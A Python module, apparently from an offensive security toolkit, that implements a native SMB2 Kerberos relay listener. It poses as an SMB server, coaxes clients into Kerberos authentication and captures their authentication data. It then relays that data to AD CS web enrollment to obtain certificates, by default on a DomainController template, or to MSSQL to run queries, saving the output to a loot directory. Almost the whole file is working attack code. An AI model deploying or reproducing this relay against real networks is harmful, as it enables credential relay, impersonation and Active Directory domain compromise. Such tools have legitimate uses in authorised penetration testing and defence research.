# -*- coding: utf-8 -*-
"""Minimal SMB2 Kerberos relay listener (stdlib socket + pyasn1, no impacket)."""

from __future__ import annotations

import calendar
import logging
import random
import socket
import string
import struct
import threading
import time
import unicodedata
from dataclasses import dataclass, field
from typing import Callable, List, Optional
from urllib.parse import urlparse

from pyasn1.codec.der import decoder, encoder

from lib.protocols.kerberos.krb_relay.utils.kerberos import get_auth_data
from lib.protocols.kerberos.krb_relay.utils.spnego import (
    GSSAPIHeader_SPNEGO_Init,
    GSSAPIHeader_SPNEGO_Init2,
    MechType,
    NegotiationToken,
    TypesMech,
)

LOG = logging.getLogger(__name__)

ASN1_AID = 0x60
SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001
SMB2_DIALECT_002 = 0x0202
SMB2_FLAGS_SERVER_TO_REDIR = 0x00000001
STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016


@dataclass
class NativeRelayConfig:
    interface_ip: str
    relay_target: str
    lootdir: str = "."
    adcs_template: str = "DomainController"
    mssql_queries: List[str] = field(default_factory=list)
    victim: Optional[str] = None
    port: int = 445


def _filetime_now() -> int:
    return int((calendar.timegm(time.gmtime()) + 11644473600) * 10000000)


def _recv_exact(sock: socket.socket, size: int) -> bytes:
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data


def _read_smb_packet(sock: socket.socket) -> bytes:
    header = _recv_exact(sock, 4)
    if len(header) < 4:
        return b""
    length = struct.unpack(">I", header)[0] & 0x00FFFFFF
    return header + _recv_exact(sock, length)


def _wrap_smb_packet(payload: bytes) -> bytes:
    return struct.pack(">I", len(payload))[:3] + b"\x00" + payload


def _build_smb2_header(
    command: int,
    message_id: int,
    session_id: int = 0,
    tree_id: int = 0,
    status: int = STATUS_SUCCESS,
) -> bytes:
    return (
        b"\xfeSMB"
        + struct.pack("<H", 64)
        + struct.pack("<H", 0)
        + struct.pack("<I", status)
        + struct.pack("<H", command)
        + struct.pack("<H", 1)
        + struct.pack("<I", SMB2_FLAGS_SERVER_TO_REDIR)
        + struct.pack("<I", 0)
        + struct.pack("<Q", message_id)
        + struct.pack("<I", 0)
        + struct.pack("<I", tree_id)
        + struct.pack("<Q", session_id)
        + b"\x00" * 16
    )


def _build_negotiate_response(message_id: int) -> bytes:
    blob = GSSAPIHeader_SPNEGO_Init2()
    blob["tokenOid"] = "1.3.6.1.5.5.2"
    blob["innerContextToken"]["mechTypes"].extend(
        [
            MechType(TypesMech["KRB5 - Kerberos 5"]),
            MechType(TypesMech["MS KRB5 - Microsoft Kerberos 5"]),
            MechType(TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]),
        ]
    )
    blob["innerContextToken"]["negHints"]["hintName"] = "not_defined_in_RFC4178@please_ignore"
    security_blob = encoder.encode(blob)
    body = (
        struct.pack("<H", 65)
        + struct.pack("<H", 0x0001)
        + struct.pack("<H", SMB2_DIALECT_002)
        + struct.pack("<H", 0)
        + bytes("".join(random.choice(string.ascii_letters) for _ in range(16)), "ascii")
        + struct.pack("<I", 0)
        + struct.pack("<III", 65536, 65536, 65536)
        + struct.pack("<QQ", _filetime_now(), _filetime_now())
        + struct.pack("<HHI", 0x80, len(security_blob), 0)
        + security_blob
    )
    return _wrap_smb_packet(_build_smb2_header(SMB2_NEGOTIATE, message_id) + body)


def _build_session_setup_response(
    message_id: int,
    session_id: int,
    status: int,
    security_blob: bytes = b"",
) -> bytes:
    offset = 88
    body = (
        struct.pack("<H", 9)
        + struct.pack("<H", 0)
        + struct.pack("<HH", offset, len(security_blob))
        + security_blob
    )
    return _wrap_smb_packet(
        _build_smb2_header(
            SMB2_SESSION_SETUP,
            message_id,
            session_id=session_id,
            status=status,
        )
        + body
    )


def _match_relay_target(authdata: dict, relay_target: str) -> bool:
    _, host = authdata["service"].split("/", 1)
    try:
        host = host.encode("latin-1").decode("utf-8")
    except (UnicodeDecodeError, UnicodeEncodeError):
        pass
    host_normalized = unicodedata.normalize("NFKD", host).encode("ascii", "ignore").decode("ascii").lower()
    target_host = (urlparse(relay_target).hostname or "").lower()
    return host_normalized in target_host or target_host in host_normalized


def _relay_auth(authdata: dict, config: NativeRelayConfig) -> None:
    if not _match_relay_target(authdata, config.relay_target):
        LOG.warning("No relay target matches SPN hostname for %s", authdata.get("service"))
        return
    relay = config.relay_target.lower()
    if "certsrv" in relay:
        from lib.protocols.http.adcs_enroll import relay_kerberos_to_adcs

        ok, path = relay_kerberos_to_adcs(
            authdata,
            config.relay_target,
            config.adcs_template,
            lootdir=config.lootdir,
        )
        if ok and path:
            LOG.info("AD CS certificate written to %s", path)
        return
    if relay.startswith("mssql://"):
        from lib.protocols.mssql.mssql_relay import relay_kerberos_to_mssql

        if not config.mssql_queries:
            LOG.error("MSSQL relay requires at least one query in mssql_queries")
            return
        ok, path = relay_kerberos_to_mssql(
            authdata,
            config.relay_target,
            queries=config.mssql_queries,
            lootdir=config.lootdir,
        )
        if ok and path:
            LOG.info("MSSQL relay output written to %s", path)
        return
    LOG.warning("Native relay does not support target scheme yet: %s", config.relay_target)


class SMB2KrbRelayServer(threading.Thread):
    def __init__(self, config: NativeRelayConfig):
        super().__init__(daemon=True)
        self.config = config
        self._sock: Optional[socket.socket] = None
        self._running = False

    def run(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.config.interface_ip, self.config.port))
        self._sock.listen(32)
        self._running = True
        LOG.info("Native SMB2 Kerberos relay listening on %s:%d", self.config.interface_ip, self.config.port)
        while self._running:
            try:
                client, addr = self._sock.accept()
            except OSError:
                break
            threading.Thread(target=self._handle_client, args=(client, addr), daemon=True).start()

    def stop(self) -> None:
        self._running = False
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None

    def _handle_client(self, client: socket.socket, addr) -> None:
        session_id = random.randint(1, 0xFFFFFFFFFFFFFFFF)
        try:
            while True:
                packet = _read_smb_packet(client)
                if not packet or len(packet) < 68:
                    break
                body = packet[4:]
                if body[0:4] != b"\xfeSMB":
                    break
                command = struct.unpack_from("<H", body, 12)[0]
                message_id = struct.unpack_from("<Q", body, 24)[0]
                if command == SMB2_NEGOTIATE:
                    client.sendall(_build_negotiate_response(message_id))
                    continue
                if command != SMB2_SESSION_SETUP:
                    break
                data_offset = 64
                setup = body[data_offset:]
                if len(setup) < 8:
                    break
                sec_offset = struct.unpack_from("<H", setup, 4)[0]
                sec_length = struct.unpack_from("<H", setup, 6)[0]
                security_blob = body[sec_offset : sec_offset + sec_length]
                if not security_blob or security_blob[0] != ASN1_AID:
                    break

                spnego = decoder.decode(security_blob, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
                mech_types = spnego["innerContextToken"]["negTokenInit"]["mechTypes"]
                if len(mech_types) > 0:
                    mech_type = str(mech_types[0])
                    if mech_type not in (
                        TypesMech["KRB5 - Kerberos 5"],
                        TypesMech["MS KRB5 - Microsoft Kerberos 5"],
                    ):
                        resp_token = NegotiationToken()
                        resp_token["negTokenResp"]["negResult"] = "request_mic"
                        resp_token["negTokenResp"]["supportedMech"] = TypesMech["KRB5 - Kerberos 5"]
                        blob = encoder.encode(resp_token)
                        client.sendall(
                            _build_session_setup_response(
                                message_id,
                                session_id,
                                STATUS_MORE_PROCESSING_REQUIRED,
                                blob,
                            )
                        )
                        continue

                class _Victim:
                    def __init__(self, victim):
                        self.victim = victim

                authdata = get_auth_data(security_blob, _Victim(self.config.victim))
                threading.Thread(target=_relay_auth, args=(authdata, self.config), daemon=True).start()

                resp_token = NegotiationToken()
                resp_token["negTokenResp"]["negResult"] = "accept_completed"
                blob = encoder.encode(resp_token)
                client.sendall(
                    _build_session_setup_response(
                        message_id,
                        session_id,
                        STATUS_SUCCESS,
                        blob,
                    )
                )
                break
        except Exception as exc:
            LOG.debug("SMB relay client %s ended: %s", addr, exc)
        finally:
            try:
                client.close()
            except OSError:
                pass


def start_native_smb2_relay_server(config: NativeRelayConfig) -> SMB2KrbRelayServer:
    server = SMB2KrbRelayServer(config)
    server.start()
    return server
